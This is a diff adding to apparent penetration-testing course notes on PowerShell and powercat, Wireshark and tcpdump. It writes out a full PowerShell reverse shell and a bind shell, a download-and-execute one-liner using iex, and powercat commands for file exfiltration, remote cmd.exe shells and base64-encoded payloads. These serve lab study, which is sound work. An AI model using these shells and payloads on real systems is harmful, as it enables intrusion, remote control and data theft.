@@ -85,5 +85,130 @@ Socat
 			From Attacker
 				socat - OPENSSL:10.11.0.4:443,verify=0
 
+Powershell and powercat
+	Powershell = cmd shell and scripting language aimed at sys admin type work (similar to bash)
+	unrestricting command execution
+		Set-ExecutionPolicy Unrestricted
 
+	Powershell file transfers
+		Either use wget or http transfers
+			powershell -c "(new-object System.Net.WebClient).DownloadFile('http://IP/FILE','C:\Users\offsec\Desktop\wget.exe')"
+			wget.exe -V
+
+	Powershell reverse shell
+		powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+		OR
+
+		check the file shell.ps1 file in this repo :)
+
+	Powerhshell Bind Shells
+		powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
+
+	NOTE: remember, to connect to a bind shell use nc -nv IP PORT
+
+Powercat
+	Powershell version of netcat written by besimorhino
+	gh link: https://github.com/besimorhino/powercat
+		iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
+	NOTE: scripts will only be loaded into the current PS instance
+
+Powercat file transfers
+	set up a listener
+		nc -lvnp 9001 443 > file.txt
+	from client
+		powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\file.txt
+			-i = file to be transferred
+
+Powercat reverse shells
+	Set up the listener
+		nc -lvvp 9001
+	from the client
+		powercat -c IP -p PORT -e cmd.exe
+			-e = specify the application to run
+
+Powercat bind shells
+	powercat -l -p 443 -e cmd
+	nc IP PORT
+
+Powercat stand-alone payloads
+	Create only the portions of the script needed to run a specific function
+	ex. a reverse shell script
+		powercat -c 10.11.0.4 -p 443 -e cmd.exe -g > reverseshell.ps1
+	likely to be caught with and IDS -> over 300 lines long and uses hardcoded strings
+	Powershell can execute base64 enc payloads!
+		why would microsoft ever implement this function?
+	generating the payload
+		powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1
+	need to pass the whole enc string into powershell -E
+		powershell.exe -E ZgB1AG4AYwB0AGkAbwBuAC...
+
+	Challenge
+		/challenge/powerflag
+		PS > . /challenge/powerflag.psq
+		powercat -c 127.0.0.1 -p 9001 -e cmd.exe
+
+Wireshark
+	Wireshark basics
+		uses either Libpcap or Winpcap to capture packets
+		capturing/ sniffing packets from the network is noisey and can get toublesome to parse
+		best to use filters on conjunction
+
+	Capture filters - filter out the packets to be captured
+		select the interface to use
+		net filter - specific subnet to capture packets on
+			< in filter bar >
+			net 10.0.0.0/8
+		can also use Capture > Capture filters
+
+	Display filters - filter what to be shown on the wireshark dash
+		Analyze > Display filters
+		tcp.port == 80
+
+	Following TCP Streams
+		wireshark can view the content within each packet
+		usually viewing streams between applications is more entertaining :)
+		right click packet > Follow > TCP Stream
+
+	Practice
+		1. find all the authenticated packets > follow tcp stream > b64 decode
+
+		2. Follow TCP stream > offsec:qwerty; inspecting data, 192.168.191.52:3084
+				port is in the XXXX -> XXXX section of the info column
+				USER offsec
+				PASS qwerty
+
+Tcpdump
+	cli packet capture tool
+	tcpdump on a file
+		tcpdump -r file.pcap
+
+	Filtering Traffic
+		using simple cli tools :)
+			sudo tcpdump -n -r password_cracking_filtered.pcap | awk -F" " '{print $5}' | sort | uniq -c | head
+				tcpdump
+					-n = skip dns lookup
+					-r = read in a packet
+				awk
+					-F = read in a field
+				uniq
+					-c = count each uniq
+		filter by the src host
+			sudo tcpdump -n src host 172.16.40.10 -r password_cracking_filtered.pcap
+		filter by the dst host
+			sudo tcpdump -n dst host 172.16.40.10 -r password_cracking_filtered.pcap
+		filter by the port
+			sudo tcpdump -n port 81 -r password_cracking_filtered.pcap
+		could use awk here for more inspecition
+
+		sudo tcpdump -nX -r password_cracking_filtered.pcap
+			-X = show the hex dump of a packet
+
+	Advanced Header Filtering
+		to better inspect the packets, only display the data packets, or the packets with the PSH and ACK flags
+		PSH and ACK are represented by the fourth and fifth bits in the 14th byte of a tcp header
+			https://www.electronicsforu.com/wp-contents/uploads/2019/09/TCP-headers.jpg
+		Binary representation of the flags is = 00011000, or 24 in decimal
+		check tcpdump to see if the 14th element in the array == 24
+			sudo tcpdump -A -n 'tcp[13] = 24' -r password_cracking_filtered.pcap
 
